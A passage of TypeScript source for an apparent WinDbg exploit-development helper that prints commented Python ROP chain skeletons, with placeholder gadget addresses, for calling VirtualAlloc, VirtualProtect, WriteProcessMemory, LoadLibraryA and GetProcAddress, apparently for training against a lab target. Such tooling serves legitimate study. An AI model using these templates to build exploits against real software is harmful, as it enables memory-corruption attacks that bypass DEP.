  out.print("    [ESP+16] = EBX  <- (lpProcName alternative — see constraints)");
  out.print("    [ESP+20] = EDX  <- (unused)");
  out.print("    [ESP+24] = ECX  <- (unused)");
  out.print("    [ESP+28] = EAX  <- (unused)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET        = ???           # bytes from buffer start to EIP control");
  out.print("GPA           = 0x????????    # GetProcAddress  dx @$osed().sc.iat_find(\"GetProcAddress\")");
  out.print("NEXT_STAGE    = 0x????????    # return addr (e.g. jmp eax / call eax to run resolved func)");
  out.print("HMODULE       = 0x????????    # hModule from LoadLibraryA (or known module base)");
  out.print("FUNC_NAME_PTR = 0x????????    # pointer to null-terminated function name string");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(GPA)         # EDI = GetProcAddress address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(HMODULE)     # EBP = hModule");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(FUNC_NAME_PTR)# EBX = lpProcName");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print("# GetProcAddress returns FARPROC in EAX — dispatch via jmp eax or call eax.");

  out.section("Constraints");
  out.print("  PUSHAD places saved ESP as the 2nd argument (lpProcName). Since saved ESP");
  out.print("  is not directly settable, the PUSHAD technique only works if:");
  out.print("  1. You use a flat stdcall frame (no PUSHAD) and place hModule/lpProcName directly.");
  out.print("  2. Or you stage lpProcName at a known address and accept saved ESP as junk,");
  out.print("     rearranging the register map to put lpProcName in EBX (requires a different");
  out.print("     dispatch shape or a RET-slide variant).");
  out.print("  3. Or chain from LoadLibraryA where EAX already holds hModule and use gadgets");
  out.print("     to marshal arguments directly.");
  out.print("");
  out.print("  For chained LoadLibraryA -> GetProcAddress resolution, a flat stdcall frame");
  out.print("  or IAT slot_call dispatch is usually simpler than PUSHAD.");
}

type Api = "VirtualAlloc" | "VirtualProtect" | "WriteProcessMemory" | "LoadLibraryA" | "GetProcAddress";
type Style = "skeleton" | "pushad";

const TEMPLATES: Record<Api, Record<Style, (mod: string) => void>> = {
  VirtualAlloc: { skeleton: vaSkeletonTemplate, pushad: vaPushadTemplate },
  VirtualProtect: { skeleton: vpSkeletonTemplate, pushad: vpPushadTemplate },
  WriteProcessMemory: { skeleton: wpmSkeletonTemplate, pushad: wpmPushadTemplate },
  LoadLibraryA: { skeleton: llaTemplate, pushad: llaTemplate },
  GetProcAddress: { skeleton: gpaTemplate, pushad: gpaTemplate },
};

export function createRopTemplateCommand(): Command {
  return {
    name: "rop_template",
    description: "Print a commented ROP chain skeleton for a supported API, in the skeleton or the PUSHAD style.",
    usage: "dx @$osed().rop_template(api?, module?, style?)",
    examples: [
      'dx @$osed().rop_template("VirtualAlloc", "essfunc")',
      'dx @$osed().rop_template("VirtualAlloc", "essfunc", "pushad")',
      'dx @$osed().rop_template("VirtualProtect", "essfunc")',
      'dx @$osed().rop_template("WriteProcessMemory", "essfunc", "pushad")',
      'dx @$osed().rop_template("LoadLibraryA", "essfunc")',
      'dx @$osed().rop_template("GetProcAddress", "essfunc")',
    ],
    schema: {
      api: { type: "string", enum: Object.keys(TEMPLATES), default: "VirtualProtect" },
      module: { type: "string", default: "TARGET_MODULE" },
      style: { type: "string", enum: ["skeleton", "pushad"], default: "skeleton" },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const api = ((options.api as string | undefined) ?? "VirtualProtect") as Api;
      const mod = (options.module as string | undefined) ?? "TARGET_MODULE";
      const style = ((options.style as string | undefined) ?? "skeleton") as Style;
      const template = TEMPLATES[api]?.[style];
      if (!template) {
        const errors = [`Unknown api "${api}" or style "${style}". APIs: ${Object.keys(TEMPLATES).join(", ")}. Styles: skeleton, pushad.`];
        return { command: "rop_template", args: options, success: false, findings: [], warnings: [], errors };
      }
      template(mod);

      return {
        command: "rop_template",
        args: options,
        success: true,
        findings: [{ api, module: mod, style }],
        warnings: [],
        errors: [],
      };
    },
  };
}
